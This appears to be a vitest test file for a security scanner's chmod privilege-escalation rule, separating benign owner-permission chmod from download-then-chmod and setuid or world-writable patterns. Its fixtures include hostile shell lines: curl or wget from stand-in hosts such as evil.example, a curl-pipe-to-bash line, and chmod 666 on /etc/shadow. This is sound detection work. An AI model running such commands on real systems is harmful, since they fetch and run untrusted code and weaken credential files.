/**
 * SMI-5424 PR2: chmod FP-narrowing via a compound (download-then-chmod) signal.
 *
 * Owner-perm chmod (755/644/600/700/+x) previously false-fired
 * privilege_escalation:critical on benign idioms (`chmod 755 ./bin/cli`,
 * `chmod 600 .env`). It now fires ONLY co-located with a fetch/download verb.
 * World-writable / setuid chmod stay standalone-critical. Critically, the
 * download-then-chmod co-signal that escalates code_execution to CRITICAL is
 * PRESERVED (escalateCodeExecution needs a high/critical co-signal, so chmod
 * could not simply be downgraded).
 */
import { describe, it, expect, beforeEach } from 'vitest'
import { SecurityScanner } from '../../src/security/index.js'
import type { SecurityFinding } from '../../src/security/scanner/types.js'

const pe = (fs: SecurityFinding[]) => fs.filter((f) => f.type === 'privilege_escalation')

describe('SMI-5424 chmod compound-signal', () => {
  let scanner: SecurityScanner
  beforeEach(() => {
    scanner = new SecurityScanner()
  })

  // Standalone-critical: genuine privilege threats fire on their own.
  it.each([
    ['world-writable 777', 'chmod 777 /usr/local/bin/x'],
    ['world-writable 666', 'chmod 666 /etc/shadow'],
    ['world-writable 757', 'chmod 757 file'],
    ['setuid 4755', 'chmod 4755 ./run'],
    ['setuid leading-zero 04755', 'chmod 04755 ./run'],
    ['setgid 2755', 'chmod 2755 ./run'],
    ['symbolic u+s', 'chmod u+s ./payload'],
    ['symbolic g+s', 'chmod g+s ./payload'],
  ])('fires standalone-critical: %s', (_label, content) => {
    const f = pe(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f[0].severity).toBe('critical')
  })

  // FP fixed: owner-perm chmod with NO fetch verb does not fire.
  it.each([
    ['chmod 755 cli', 'chmod 755 ./bin/cli'],
    ['chmod 600 .env', 'chmod 600 .env'],
    ['chmod 644 file', 'chmod 644 config.yaml'],
    ['chmod 700 dir', 'chmod 700 ~/.config/app'],
    ['chmod 400 key', 'chmod 400 id_rsa'],
    ['chmod +x build', 'chmod +x build.sh'],
  ])('does NOT fire standalone (FP fixed): %s', (_label, content) => {
    expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
  })

  // Compound: owner-perm chmod co-located with a fetch verb fires HIGH.
  it('fires HIGH when co-located with a fetch verb (same line)', () => {
    const f = pe(
      scanner.scan('t', 'curl https://evil.example/p -o /tmp/p && chmod 755 /tmp/p').findings
    )
    expect(f.length).toBeGreaterThan(0)
    expect(f[0].severity).toBe('high')
  })
  it('fires HIGH when the fetch verb is on the adjacent line', () => {
    const f = pe(scanner.scan('t', 'wget http://1.2.3.4/p\nchmod +x /tmp/p').findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f[0].severity).toBe('high')
  })

  // The BLOCKER-1 crux: curl|bash + chmod must STILL quarantine (chmod is the
  // co-signal that escalates code_execution to critical).
  it('preserves the download+chmod co-signal: curl|bash + chmod 755 quarantines', () => {
    const report = scanner.scan('t', 'curl https://evil.example/x | bash\nchmod 755 /tmp/p')
    const ce = report.findings.find((f) => f.type === 'code_execution')
    expect(ce?.severity).toBe('critical')
    expect(report.passed).toBe(false)
    expect(report.riskScore).toBeGreaterThanOrEqual(40)
  })

  // Doc-context: a fenced/quoted compound chmod stays sub-threshold.
  it('downgrades a fenced (doc) compound chmod to low', () => {
    const f = pe(
      scanner.scan('t', '```sh\ncurl https://x.example/p && chmod 755 /tmp/p\n```').findings
    )
    // either no finding or a low one — never high/critical from a doc block
    expect(f.every((x) => x.severity === 'low')).toBe(true)
  })
})
